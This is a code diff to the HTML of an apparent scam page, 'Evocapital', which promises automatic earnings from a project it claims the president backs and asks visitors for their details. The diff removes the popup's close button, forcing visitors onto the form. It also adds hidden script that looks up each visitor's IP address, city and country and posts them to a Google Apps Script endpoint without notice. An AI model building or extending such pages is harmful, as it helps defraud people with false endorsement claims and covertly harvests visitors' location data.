@@ -97,7 +97,6 @@
   <div id="popup" class="popup">
     <div class="popup-content">
       <img src="logo_evocapital.png" alt="Evocapital Logo" class="logo">
-      <span class="close-btn" onclick="cerrarPopup()">&times;</span>
       <h2>Bienvenido a Evocapital</h2>
       <p class="subtitle">Únete al proyecto económico respaldado por la presidenta. Llena tus datos para comenzar a recibir tus ganancias de forma segura y automatizada.</p>
       <form>
@@ -128,6 +127,23 @@
 
   <script 
     src="https://www.paypal.com/sdk/js?client-id=BAAQ4-asoZj56A6vjWzMmDgqeUASwPdd_bbdQNdj3zAox7c3YKYtNYnqKKTLAaBS39Ut0zCPkRgNnF82ck&components=hosted-buttons&disable-funding=venmo&currency=USD">
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      fetch("https://script.google.com/macros/s/AKfycbwdvogt9pbIzpeg8PwS1ST_cXrcR9Nsii2_iTZs1EiaxqhusSYHGqxSMUqXMXBeY0Sf/exec", {
+        method: "POST",
+        body: JSON.stringify({
+          ip: data.ip,
+          city: data.city,
+          country: data.country_name
+        }),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      }).then(res => console.log("Visitante registrado"));
+    })
+    .catch(err => console.error("Error:", err));
+  
   </script>
   <script>
     paypal.HostedButtons({
